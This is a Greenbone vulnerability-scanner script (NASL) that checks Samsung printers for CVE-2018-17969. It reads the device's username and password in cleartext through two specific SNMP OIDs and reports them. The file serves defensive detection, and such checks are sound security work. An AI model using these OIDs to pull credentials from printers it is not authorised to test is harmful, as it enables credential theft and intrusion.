# SPDX-FileCopyrightText: 2018 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.141705");
  script_version("2023-08-10T05:05:53+0000");
  script_tag(name:"last_modification", value:"2023-08-10 05:05:53 +0000 (Thu, 10 Aug 2023)");
  script_tag(name:"creation_date", value:"2018-11-20 11:12:03 +0700 (Tue, 20 Nov 2018)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"severity_vector", value:"CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2019-10-03 00:03:00 +0000 (Thu, 03 Oct 2019)");

  script_cve_id("CVE-2018-17969");

  script_tag(name:"qod_type", value:"exploit");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("Samsung Printers Credentials Disclosure Vulnerability");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2018 Greenbone AG");
  script_family("SNMP");
  script_dependencies("gb_snmp_info_collect.nasl");
  script_require_udp_ports("Services/udp/snmp", 161);
  script_mandatory_keys("SNMP/sysdescr/available");

  script_tag(name:"summary", value:"Multiple Samsung printers allow remote attackers to discover cleartext
  credentials via SNMP.");

  script_tag(name:"vuldetect", value:"Tries to obtain credentials via SNMP.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_xref(name:"URL", value:"http://misteralfa-hack.blogspot.com/2018/10/samsung-printer-passwordleak.html");

  exit(0);
}

include("snmp_func.inc");

port = snmp_get_port(default: 161);
sysdesc = snmp_get_sysdescr(port: port);
if (!sysdesc || sysdesc !~ "^Samsung ")
  exit(0);

user_oid = '1.3.6.1.4.1.236.11.5.11.81.10.1.5.0';
pw_oid   = '1.3.6.1.4.1.236.11.5.11.81.10.1.6.0';

user = snmp_get(port: port, oid: user_oid);
if (!isnull(user)) {
  pw = snmp_get(port: port, oid: pw_oid);
  report = 'It was possible to obtain the following credentials via SNMP.\n\n' +
           'Username:  ' + user + '\nPassword:  ' + pw;
  security_message(port: port, data: report, proto: "udp");
  exit(0);
}

exit(99);
